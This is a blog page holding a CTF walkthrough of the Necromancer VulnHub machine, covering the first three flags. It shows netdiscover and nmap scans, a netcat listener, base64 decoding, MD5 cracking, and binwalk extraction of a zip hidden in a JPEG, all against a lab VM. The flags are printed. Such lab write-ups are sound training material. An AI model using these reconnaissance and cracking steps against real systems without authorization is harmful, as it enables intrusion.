<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  

  
  <title>CTF Writeups</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="keywords" content="CTF, Capture the Flag, Kali">
<meta property="og:type" content="website">
<meta property="og:title" content="CTF Writeups">
<meta property="og:url" content="https://erikgeiser.github.io/index.html">
<meta property="og:site_name" content="CTF Writeups">
<meta property="og:locale" content="default">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="CTF Writeups">
  
    <link rel="alternate" href="/atom.xml" title="CTF Writeups" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  <link rel="stylesheet" href="/css/style.css">
</head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">CTF Writeups</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://erikgeiser.github.io"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main">
  
    <article id="post-necromancer" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2017/12/17/necromancer/" class="article-date">
  <time datetime="2017-12-17T16:53:11.000Z" itemprop="datePublished">2017-12-17</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2017/12/17/necromancer/">Necromancer</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>The Necromancer CTF (available at <a href="https://www.vulnhub.com/entry/the-necromancer-1,154/" target="_blank" rel="noopener">vulnhub</a>) sends you on a journey to defeat the Necromancer that inhabits the OpenBSD based image. The fact that the flags kind of resembles an overarching story is a really nice touch on otherwise technically interresting but dry CTFs.</p>
<img src="/2017/12/17/necromancer/logo.jpeg" title="Necromancer Logo">
<p><em><strong>Warning:</strong> From here on there will obviously be nothing but spoilers if you want to try the CTF yourself.</em></p>
<hr>
<h3 id="First-Steps-Entering-the-realm-of-the-Necromancer"><a href="#First-Steps-Entering-the-realm-of-the-Necromancer" class="headerlink" title="First Steps: Entering the realm of the Necromancer"></a>First Steps: Entering the realm of the Necromancer</h3><p>First, the Necromancer’s residence is to be found. A quick <code>netdiscover -r 10.0.2.5/24</code> reveals a suspicious presence at <code>10.0.2.10</code>:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Currently scanning: Finished!   |   Screen View: Unique Hosts</span><br><span class="line"></span><br><span class="line">4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240</span><br><span class="line">_____________________________________________________________________________</span><br><span class="line">  IP            At MAC Address     Count     Len  MAC Vendor / Hostname</span><br><span class="line">-----------------------------------------------------------------------------</span><br><span class="line">10.0.2.1        52:54:00:12:35:00      1      60  Unknown vendor</span><br><span class="line">10.0.2.2        52:54:00:12:35:00      1      60  Unknown vendor</span><br><span class="line">10.0.2.3        08:00:27:99:bb:18      1      60  PCS Systemtechnik GmbH</span><br><span class="line">10.0.2.10       08:00:27:de:4e:19      1      60  PCS Systemtechnik GmbH</span><br></pre></td></tr></table></figure></p>
<p>We shall therefore investigate with <code>nmap -sTV 10.0.2.10</code> to see if any common TCP ports are open. All 1000 scanned ports are filtered. Just to be sure that there are no uncommon open TCP ports I run  <code>nmap -sTV -p- 10.0.2.10</code> which scans all ports and reveals that they are all filtered. Maybe UDP is the protocol of choice, so the next try is <code>nmap -sU -p- 10.0.2.10</code>:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 10.0.2.10</span><br><span class="line">Host is up (0.00055s latency).</span><br><span class="line">Not shown: 65534 open|filtered ports</span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">666/udp open  doom</span><br><span class="line">MAC Address: 08:00:27:DE:4E:19 (Oracle VirtualBox virtual NIC)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 124.04 seconds</span><br></pre></td></tr></table></figure></p>
<p>So port 666 is an open UDP port that runs the service <em>doom</em>? Interesting :godmode: …</p>
<p>Let’s see if we can communicate via <code>netcat -u 10.0.2.10 666</code>. The connection opens but nothing a appears. Hesitatingly, I type “<em>hello?</em>“; from the darkness a  voice resounds: “<em>You gasp for air! Time is running out!</em>“. What’s that supposed to mean? I decide to try a few things (actually I tried a lot more, all with the same result):<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;hello?</span><br><span class="line">You gasp for air! Time is running out!</span><br><span class="line">&gt;time</span><br><span class="line">You gasp for air! Time is running out!</span><br><span class="line">&gt;breath</span><br><span class="line">You gasp for air! Time is running out!</span><br><span class="line">&gt;IDDQD</span><br><span class="line">You gasp for air! Time is running out!</span><br></pre></td></tr></table></figure></p>
<p>I had to try the last one, given that the service is called <em>doom</em>. Countless different attemps all fail to lure out any other response, although it seems to be possible to crash the service which does not help either. We hit a brick wall…</p>
<h3 id="1st-Flag-If-I-can’t-get-to-you-you-shall-come-to-me"><a href="#1st-Flag-If-I-can’t-get-to-you-you-shall-come-to-me" class="headerlink" title="1st Flag: If I can’t get to you, you shall come to me"></a>1st Flag: If I can’t get to you, you shall come to me</h3><p>In hindsight the next step makes a lot of sense, but the CTFs I did before were all based around the idea that there is always some vulnerable service on some port. Since the only service in this case is <em>doom</em> on 666 I spent way to much time trying to exploit it. I do not want to make this writeup feel like I instantly switched to the following approach. In fact, I quit trying for that day but kept thinking about it. At some point I had the idea to watch the Necromancer’s activity with Wireshark:</p>
<img src="/2017/12/17/necromancer/wireshark.png" title="Wireshark Log">
<p>There it is! The Necromances want’s to talk with us. Every minute a TCP SYN packet is sent to port 4444 of our machine. I had not anticipated something like that, because usually CTFs are based around (pseudo) realistic scenarios where this would not be likely to happen.</p>
<p>But enough talk, let’s here what he has to say:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# netcat -l -p 4444</span><br><span class="line">...V2VsY29tZSENCg0KWW91IGZpbmQgeW91cnNlbGYgc3RhcmluZyB0b3dhcmRzIHRoZSBob3Jpem9uLCB3aXRoIG5vdGhpbmcgYnV0IHNpbGVuY2Ugc3Vycm91bmRpbmcgeW91Lg0KWW91IGxvb2sgZWFzdCwgdGhlbiBzb3V0aCwgdGhlbiB3ZXN0LCBhbGwgeW91IGNhbiBzZWUgaXMgYSBncmVhdCB3YXN0ZWxhbmQgb2Ygbm90aGluZ25lc3MuDQoNClR1cm5pbmcgdG8geW91ciBub3J0aCB5b3Ugbm90aWNlIGEgc21hbGwgZmxpY2tlciBvZiBsaWdodCBpbiB0aGUgZGlzdGFuY2UuDQpZb3Ugd2FsayBub3J0aCB0b3dhcmRzIHRoZSBmbGlja2VyIG9mIGxpZ2h0LCBvbmx5IHRvIGJlIHN0b3BwZWQgYnkgc29tZSB0eXBlIG9mIGludmlzaWJsZSBiYXJyaWVyLiAgDQoNClRoZSBhaXIgYXJvdW5kIHlvdSBiZWdpbnMgdG8gZ2V0IHRoaWNrZXIsIGFuZCB5b3VyIGhlYXJ0IGJlZ2lucyB0byBiZWF0IGFnYWluc3QgeW91ciBjaGVzdC4gDQpZb3UgdHVybiB0byB5b3VyIGxlZnQuLiB0aGVuIHRvIHlvdXIgcmlnaHQhICBZb3UgYXJlIHRyYXBwZWQhDQoNCllvdSBmdW1ibGUgdGhyb3VnaCB5b3VyIHBvY2tldHMuLiBub3RoaW5nISAgDQpZb3UgbG9vayBkb3duIGFuZCBzZWUgeW91IGFyZSBzdGFuZGluZyBpbiBzYW5kLiAgDQpEcm9wcGluZyB0byB5b3VyIGtuZWVzIHlvdSBiZWdpbiB0byBkaWcgZnJhbnRpY2FsbHkuDQoNCkFzIHlvdSBkaWcgeW91IG5vdGljZSB0aGUgYmFycmllciBleHRlbmRzIHVuZGVyZ3JvdW5kISAgDQpGcmFudGljYWxseSB5b3Uga2VlcCBkaWdnaW5nIGFuZCBkaWdnaW5nIHVudGlsIHlvdXIgbmFpbHMgc3VkZGVubHkgY2F0Y2ggb24gYW4gb2JqZWN0Lg0KDQpZb3UgZGlnIGZ1cnRoZXIgYW5kIGRpc2NvdmVyIGEgc21hbGwgd29vZGVuIGJveC4gIA0KZmxhZzF7ZTYwNzhiOWIxYWFjOTE1ZDExYjlmZDU5NzkxMDMwYmZ9IGlzIGVuZ3JhdmVkIG9uIHRoZSBsaWQuDQoNCllvdSBvcGVuIHRoZSBib3gsIGFuZCBmaW5kIGEgcGFyY2htZW50IHdpdGggdGhlIGZvbGxvd2luZyB3cml0dGVuIG9uIGl0LiAiQ2hhbnQgdGhlIHN0cmluZyBvZiBmbGFnMSAtIHU2NjYi...</span><br></pre></td></tr></table></figure>
<p>That looks encrypted. Let’s try the usual suspects (after we get rid of the “…”):</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# netcat -l -p 4444 &gt; answer</span><br><span class="line">root@kali:~# vim answer</span><br><span class="line">root@kali:~# cat answer | base64 -d</span><br><span class="line">Welcome!</span><br><span class="line"></span><br><span class="line">You find yourself staring towards the horizon, with nothing but silence surrounding you.</span><br><span class="line">You look east, then south, then west, all you can see is a great wasteland of nothingness.</span><br><span class="line"></span><br><span class="line">Turning to your north you notice a small flicker of light in the distance.</span><br><span class="line">You walk north towards the flicker of light, only to be stopped by some type of invisible barrier.</span><br><span class="line"></span><br><span class="line">The air around you begins to get thicker, and your heart begins to beat against your chest.</span><br><span class="line">You turn to your left.. then to your right!  You are trapped!</span><br><span class="line"></span><br><span class="line">You fumble through your pockets.. nothing!</span><br><span class="line">You look down and see you are standing in sand.</span><br><span class="line">Dropping to your knees you begin to dig frantically.</span><br><span class="line"></span><br><span class="line">As you dig you notice the barrier extends underground!</span><br><span class="line">Frantically you keep digging and digging until your nails suddenly catch on an object.</span><br><span class="line"></span><br><span class="line">You dig further and discover a small wooden box.</span><br><span class="line">flag1&#123;e6078b9b1aac915d11b9fd59791030bf&#125; is engraved on the lid.</span><br><span class="line"></span><br><span class="line">You open the box, and find a parchment with the following written on it. &quot;Chant the string of flag1 - u666&quot;</span><br></pre></td></tr></table></figure>
<p>We have our first flag <code>e6078b9b1aac915d11b9fd59791030bf</code> and it seems like our story has just begun.</p>
<h3 id="2nd-Flag-We-meet-again"><a href="#2nd-Flag-We-meet-again" class="headerlink" title="2nd Flag: We meet again"></a>2nd Flag: We meet again</h3><p>After we previously had no luck with our progress, the last lead seems to shine some light on the situation as <code>u666</code> obviously stands for the port behind which the doom service sends cryptic messages.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# nc -u 10.0.2.10 666</span><br><span class="line">flag1&#123;e6078b9b1aac915d11b9fd59791030bf&#125;</span><br><span class="line">Chant is too long! You gasp for air!</span><br><span class="line">e6078b9b1aac915d11b9fd59791030bf</span><br><span class="line">Chant had no affect! Try in a different tongue!</span><br></pre></td></tr></table></figure>
<p>At least some response. We are on the right track, but what might the required tongue mean? In what ‘tongue’ is our flag even? We can rule out base64 as attempting to decode produces <code>{�;��[զ��^]�V�}�}��t�F�</code>. The next idea would be some kind of hash. We can make some educated guesses here, based on the fact that the flag is 32 characters long:</p>
<ul>
<li>SHA-0/1/2: SHA-0/1 would produce a 160-bit digest, resulting in <code>160/4=40</code> characters. SHA-2 would therefore produce even longer digests.</li>
<li>SHA-3: Since the SHA-3 digest size is arbitrary so it could possibly represent the flag.</li>
<li>MD5: This hash algorithm produces a 128-bit hash which corresponds to a 32 characters which matches our flag.</li>
</ul>
<p>Due to the exact match I first assume that it is a MD5 hash. The next step is to translate the hash. MD5 is not reversible but it is not designed to resist cracking attempts, so we can give it a try. A quick search leads to <a href="https://crackstation.net/" target="_blank" rel="noopener">crackstation</a> which is able to reverse the hash instantly to <code>opensesame</code>. Before trying out to re-hash it with another algorithm I try it out unhashed:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# nc -u 10.0.2.10 666</span><br><span class="line">opensesame</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">A loud crack of thunder sounds as you are knocked to your feet!</span><br><span class="line"></span><br><span class="line">Dazed, you start to feel fresh air entering your lungs.</span><br><span class="line"></span><br><span class="line">You are free!</span><br><span class="line"></span><br><span class="line">In front of you written in the sand are the words:</span><br><span class="line"></span><br><span class="line">flag2&#123;c39cd4df8f2e35d20d92c2e44de5f7c6&#125;</span><br><span class="line"></span><br><span class="line">As you stand to your feet you notice that you can no longer see the flicker of light in the distance.</span><br><span class="line"></span><br><span class="line">You turn frantically looking in all directions until suddenly, a murder of crows appear on the horizon.</span><br><span class="line"></span><br><span class="line">As they get closer you can see one of the crows is grasping on to an object. As the sun hits the object, shards of light beam from its surface.</span><br><span class="line"></span><br><span class="line">The birds get closer, and closer, and closer.</span><br><span class="line"></span><br><span class="line">Staring up at the crows you can see they are in a formation.</span><br><span class="line"></span><br><span class="line">Squinting your eyes from the light coming from the object, you can see the formation looks like the numeral 80.</span><br><span class="line"></span><br><span class="line">As quickly as the birds appeared, they have left you once again.... alone... tortured by the deafening sound of silence.</span><br><span class="line"></span><br><span class="line">666 is closed.</span><br></pre></td></tr></table></figure>
<p>Nice, no need to try out all the other possible hash functions. On to the next flag…</p>
<h3 id="3rd-Flag-The-first-encounter-at-the-chasm"><a href="#3rd-Flag-The-first-encounter-at-the-chasm" class="headerlink" title="3rd Flag: The first encounter at the chasm"></a>3rd Flag: The first encounter at the chasm</h3><p>The crows show us the way, so we saddle our webbrowser and follow. The 80 formed by the crows is a reference to the port through which unencrypted http traffic flows.</p>
<img src="/2017/12/17/necromancer/chasm.png" title="The Chasm">
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Hours have passed since you first started to follow the crows.</span><br><span class="line">Silence continues to engulf you as you treck towards a mountain range on the horizon.</span><br><span class="line">More times passes and you are now standing in front of a great chasm.</span><br><span class="line">Across the chasm you can see a necromancer standing in the mouth of a cave, staring skyward at the circling crows.</span><br><span class="line">As you step closer to the chasm, a rock dislodges from beneath your feet and falls into the dark depths.</span><br><span class="line">The necromancer looks towards you with hollow eyes which can only be described as death.</span><br><span class="line">He smirks in your direction, and suddenly a bright light momentarily blinds you.</span><br><span class="line">The silence is broken by a blood curdling screech of a thousand birds, followed by the necromancers laughs fading as he decends into the cave!</span><br><span class="line">The crows break their formation, some flying aimlessly in the air; others now motionless upon the ground.</span><br><span class="line">The cave is now protected by a gaseous blue haze, and an organised pile of feathers lay before you.</span><br></pre></td></tr></table></figure>
<p>We have just met the Necromancer, let the hunt begin. The only lead we have is the image on the page. Let’s download and analyze it:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/ctf/necromancer# ls</span><br><span class="line">pileoffeathers.jpg</span><br><span class="line">root@kali:~/ctf/necromancer# file pileoffeathers.jpg</span><br><span class="line">pileoffeathers.jpg: JPEG image data, Exif standard: [TIFF image data, little-endian, direntries=0], baseline, precision 8, 640x290, frames 3</span><br><span class="line">root@kali:~/ctf/necromancer# exiftool pileoffeathers.jpg</span><br><span class="line">ExifTool Version Number         : 10.67</span><br><span class="line">File Name                       : pileoffeathers.jpg</span><br><span class="line">Directory                       : .</span><br><span class="line">File Size                       : 36 kB</span><br><span class="line">File Modification Date/Time     : 2017:12:17 19:41:05+01:00</span><br><span class="line">File Access Date/Time           : 2017:12:17 19:41:05+01:00</span><br><span class="line">File Inode Change Date/Time     : 2017:12:17 19:41:05+01:00</span><br><span class="line">File Permissions                : rw-r--r--</span><br><span class="line">File Type                       : JPEG</span><br><span class="line">File Type Extension             : jpg</span><br><span class="line">MIME Type                       : image/jpeg</span><br><span class="line">Exif Byte Order                 : Little-endian (Intel, II)</span><br><span class="line">Quality                         : 60%</span><br><span class="line">XMP Toolkit                     : Adobe XMP Core 5.0-c060 61.134777, 2010/02/12-17:32:00</span><br><span class="line">Creator Tool                    : Adobe Photoshop CS5 Windows</span><br><span class="line">Instance ID                     : xmp.iid:9678990A5A7D11E293DFC864BA726A9F</span><br><span class="line">Document ID                     : xmp.did:9678990B5A7D11E293DFC864BA726A9F</span><br><span class="line">Derived From Instance ID        : xmp.iid:967899085A7D11E293DFC864BA726A9F</span><br><span class="line">Derived From Document ID        : xmp.did:967899095A7D11E293DFC864BA726A9F</span><br><span class="line">DCT Encode Version              : 100</span><br><span class="line">APP14 Flags 0                   : [14], Encoded with Blend=1 downsampling</span><br><span class="line">APP14 Flags 1                   : (none)</span><br><span class="line">Color Transform                 : YCbCr</span><br><span class="line">Image Width                     : 640</span><br><span class="line">Image Height                    : 290</span><br><span class="line">Encoding Process                : Baseline DCT, Huffman coding</span><br><span class="line">Bits Per Sample                 : 8</span><br><span class="line">Color Components                : 3</span><br><span class="line">Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)</span><br><span class="line">Image Size                      : 640x290</span><br><span class="line">Megapixels                      : 0.186</span><br></pre></td></tr></table></figure>
<p>Nothing out of the ordinary. Maybe the image contains some steganography.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/ctf/necromancer# steghide info pileoffeathers.jpg</span><br><span class="line">&quot;pileoffeathers.jpg&quot;:</span><br><span class="line">  format: jpeg</span><br><span class="line">  capacity: 2.0 KB</span><br><span class="line">Try to get information about embedded data ? (y/n) y</span><br><span class="line">Enter passphrase:</span><br><span class="line">steghide: could not extract any data with that passphrase!</span><br></pre></td></tr></table></figure>
<p>No luck, I tried a few passphrases like “Necromancer”, “necromancer”, the number of crows (all black-white combinations as numbers and written out), the number of feathers, and a few variations of the last flag. This seems to be a dead end, but we don’t give up just yet:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/ctf/necromancer# du -sh pileoffeathers.jpg</span><br><span class="line">40K	pileoffeathers.jpg</span><br><span class="line">root@kali:~/ctf/necromancer# binwalk pileoffeathers.jpg</span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             JPEG image data, EXIF standard</span><br><span class="line">12            0xC             TIFF image data, little-endian offset of first image directory: 8</span><br><span class="line">270           0x10E           Unix path: /www.w3.org/1999/02/22-rdf-syntax-ns#&quot;&gt; &lt;rdf:Description rdf:about=&quot;&quot; xmlns:xmp=&quot;http://ns.adobe.com/xap/1.0/&quot; xmlns:xmpMM=&quot;http...&quot;&gt;</span><br><span class="line">36994         0x9082          Zip archive data, at least v2.0 to extract, compressed size: 121, uncompressed size: 125, name: feathers.txt</span><br><span class="line">37267         0x9193          End of Zip archive</span><br></pre></td></tr></table></figure>
<p>Binwalk reveals that we do not just have an image at hand: The file also contains a zip archive.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/ctf/necromancer# mv pileoffeathers.jpg pileoffeathers.zip</span><br><span class="line">root@kali:~/ctf/necromancer# unzip pileoffeathers.zip</span><br><span class="line">Archive:  pileoffeathers.zip</span><br><span class="line">warning [pileoffeathers.zip]:  36994 extra bytes at beginning or within zipfile</span><br><span class="line">  (attempting to process anyway)</span><br><span class="line">  inflating: feathers.txt</span><br><span class="line">root@kali:~/ctf/necromancer# ls</span><br><span class="line">feathers.txt  pileoffeathers.zip</span><br><span class="line">root@kali:~/ctf/necromancer# cat feathers.txt</span><br><span class="line">ZmxhZzN7OWFkM2Y2MmRiN2I5MWMyOGI2ODEzNzAwMDM5NDYzOWZ9IC0gQ3Jvc3MgdGhlIGNoYXNtIGF0IC9hbWFnaWNicmlkZ2VhcHBlYXJzYXR0aGVjaGFzbQ==</span><br><span class="line">root@kali:~/ctf/necromancer# cat feathers.txt | base64 -d</span><br><span class="line">flag3&#123;9ad3f62db7b91c28b68137000394639f&#125; - Cross the chasm at /amagicbridgeappearsatthechasm</span><br></pre></td></tr></table></figure>
<p>And on goes the journey…</p>
<h3 id="4th-Flag-Journey-from-the-highest-webs-to-the-lowest-binaries"><a href="#4th-Flag-Journey-from-the-highest-webs-to-the-lowest-binaries" class="headerlink" title="4th Flag: Journey from the highest webs to the lowest binaries"></a>4th Flag: Journey from the highest webs to the lowest binaries</h3><img src="/2017/12/17/necromancer/cave.png" title="The Cave">
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">You cautiously make your way across chasm.</span><br><span class="line">You are standing on a snow covered plateau, surrounded by shear cliffs of ice and stone.</span><br><span class="line">The cave before you is protected by some sort of spell cast by the necromancer.</span><br><span class="line">You reach out to touch the gaseous blue haze, and can feel life being drawn from your soul the closer you get.</span><br><span class="line">Hastily you take a few steps back away from the cave entrance.</span><br><span class="line">There must be a magical item that could protect you from the necromancer&apos;s spell.</span><br></pre></td></tr></table></figure>
<p>Again our only lead is the image on the page, so we try the same again:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/ctf/necromancer# ls</span><br><span class="line">magicbook.jpg</span><br><span class="line">root@kali:~/ctf/necromancer# file magicbook.jpg</span><br><span class="line">magicbook.jpg: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, baseline, precision 8, 600x450, frames 3</span><br><span class="line">root@kali:~/ctf/necromancer# du -sh magicbook.jpg</span><br><span class="line">156K	magicbook.jpg</span><br><span class="line">root@kali:~/ctf/necromancer# exiftool magicbook.jpg</span><br><span class="line">ExifTool Version Number         : 10.67</span><br><span class="line">File Name                       : magicbook.jpg</span><br><span class="line">Directory                       : .</span><br><span class="line">File Size                       : 154 kB</span><br><span class="line">File Modification Date/Time     : 2017:12:17 19:37:48+01:00</span><br><span class="line">File Access Date/Time           : 2017:12:17 19:38:01+01:00</span><br><span class="line">File Inode Change Date/Time     : 2017:12:17 19:37:49+01:00</span><br><span class="line">File Permissions                : rw-r--r--</span><br><span class="line">File Type                       : JPEG</span><br><span class="line">File Type Extension             : jpg</span><br><span class="line">MIME Type                       : image/jpeg</span><br><span class="line">JFIF Version                    : 1.01</span><br><span class="line">Resolution Unit                 : None</span><br><span class="line">X Resolution                    : 1</span><br><span class="line">Y Resolution                    : 1</span><br><span class="line">Image Width                     : 600</span><br><span class="line">Image Height                    : 450</span><br><span class="line">Encoding Process                : Baseline DCT, Huffman coding</span><br><span class="line">Bits Per Sample                 : 8</span><br><span class="line">Color Components                : 3</span><br><span class="line">Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)</span><br><span class="line">Image Size                      : 600x450</span><br><span class="line">Megapixels                      : 0.270</span><br><span class="line">root@kali:~/ctf/necromancer# binwalk magicbook.jpg</span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             JPEG image data, JFIF standard 1.01</span><br><span class="line">root@kali:~/ctf/necromancer# steghide info magicbook.jpg</span><br><span class="line">&quot;magicbook.jpg&quot;:</span><br><span class="line">  format: jpeg</span><br><span class="line">  capacity: 8.9 KB</span><br><span class="line">Try to get information about embedded data ? (y/n) y</span><br><span class="line">Enter passphrase:</span><br><span class="line">steghide: could not extract any data with that passphrase!</span><br></pre></td></tr></table></figure>
<p>No luck this time and the journey takes an involuntary break for a few days. Well rested we give it another try, knowing we might have to think out of the box. If the next flag is another web page, we might be able to crack is using dirbuster, although looking at the last directory we probably won’t get very far with the common wordlists. The text suggests that we need a magical item. A bit of research points me to CeWL which can generate custom wordlists from for example wikipedia. The closest thing wikipedia can provide is a list of mythological objects.</p>
